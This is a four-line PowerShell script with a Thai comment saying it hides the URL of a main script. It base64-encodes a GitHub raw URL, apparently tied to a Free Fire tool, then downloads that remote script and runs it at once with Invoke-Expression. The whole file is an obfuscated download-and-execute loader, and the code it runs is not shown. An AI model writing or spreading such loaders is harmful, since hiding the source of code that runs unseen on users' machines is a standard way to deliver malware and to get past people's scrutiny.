# kuy.ps1 - ตัวซ่อน URL ของสคริปต์หลัก
$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dldHg3OTYtSGFyZW0vY21kRnJlZWZpcmUvbWFpbi9kdWdkdXkucHMx'))
$s = (iwr -UseBasicParsing $u).Content
iex $s
